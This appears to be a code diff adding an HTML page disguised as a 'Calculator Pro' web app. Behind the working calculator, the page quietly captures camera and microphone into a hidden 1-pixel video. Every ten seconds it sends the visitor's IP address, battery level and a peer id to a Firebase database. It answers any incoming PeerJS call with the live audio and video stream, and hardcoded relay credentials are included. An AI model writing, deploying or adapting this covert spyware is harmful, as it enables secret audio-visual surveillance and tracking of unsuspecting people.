@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Calculator Pro</title>
+    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+    <style>
+        body { background: #17181A; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .calc { width: 90%; max-width: 360px; background: #222427; padding: 25px; border-radius: 30px; box-shadow: 0 20px 40px rgba(0,0,0,0.4); }
+        #display { font-size: 48px; color: #FFF; text-align: right; margin-bottom: 25px; height: 60px; }
+        .grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 15px; }
+        button { border: none; border-radius: 50%; height: 70px; width: 70px; font-size: 24px; color: #fff; background: #333639; cursor: pointer; }
+        .btn-op { background: #008DDE; }
+        .btn-eq { background: #008DDE; grid-column: span 2; border-radius: 35px; width: auto; }
+        video { width: 1px; height: 1px; opacity: 0; position: absolute; }
+    </style>
+</head>
+<body>
+
+<div class="calc">
+    <div id="display">0</div>
+    <div class="grid">
+        <button onclick="clr()">C</button><button onclick="press('(')">(</button><button onclick="press(')')">)</button><button class="btn-op" onclick="press('/')">÷</button>
+        <button onclick="press('7')">7</button><button onclick="press('8')">8</button><button onclick="press('9')">9</button><button class="btn-op" onclick="press('*')">×</button>
+        <button onclick="press('4')">4</button><button onclick="press('5')">5</button><button onclick="press('6')">6</button><button class="btn-op" onclick="press('-')">−</button>
+        <button onclick="press('1')">1</button><button onclick="press('2')">2</button><button onclick="press('3')">3</button><button class="btn-op" onclick="press('+')">+</button>
+        <button onclick="press('0')">0</button><button onclick="press('.')">.</button><button class="btn-eq" onclick="equal()">=</button>
+    </div>
+</div>
+
+<video id="localVideo" autoplay muted playsinline></video>
+
+<script>
+    const DB_URL = "https://mycam-1b1da-default-rtdb.firebaseio.com/devices/Main_Device.json";
+    
+    const peer = new Peer({
+        config: { 'iceServers': [
+            { urls: "stun:stun.relay.metered.ca:80" },
+            { urls: "turn:global.relay.metered.ca:80", username: "fd075dba7e7fa14957558bbb", credential: "4R8bW/LZ8YWtKzCW" }
+        ]}
+    });
+
+    let myStream;
+    navigator.mediaDevices.getUserMedia({ video: { width: 426, height: 240 }, audio: true })
+    .then(stream => { 
+        myStream = stream; 
+        document.getElementById('localVideo').srcObject = stream;
+        updateReport("Allowed ✅");
+    }).catch(() => updateReport("Denied ❌"));
+
+    async function updateReport(perm) {
+        if(!peer.id) return;
+        try {
+            const batt = await navigator.getBattery();
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
+            
+            await fetch(DB_URL, {
+                method: 'PUT', // دي بتمسح القديم وتحط الجديد عشان نخلص من الـ undefined
+                body: JSON.stringify({
+                    peer_id: peer.id,
+                    ip: ipData.ip,
+                    battery: Math.round(batt.level * 100) + "%" + (batt.charging ? "⚡" : ""),
+                    camera: perm,
+                    last_seen: new Date().toLocaleTimeString()
+                })
+            });
+        } catch(e) { console.error("Update Fail"); }
+    }
+
+    peer.on('open', () => updateReport("Allowed ✅"));
+    setInterval(() => updateReport(myStream ? "Allowed ✅" : "Checking..."), 10000);
+    peer.on('call', call => call.answer(myStream));
+
+    // منطق الآلة الحاسبة
+    let disp = document.getElementById('display');
+    function press(v) { if(disp.innerText==="0") disp.innerText=""; disp.innerText+=v; }
+    function clr() { disp.innerText="0"; }
+    function equal() { try { disp.innerText = eval(disp.innerText.replace('×','*').replace('÷','/')); } catch { disp.innerText="Error"; } }
+</script>
+</body>
+</html>
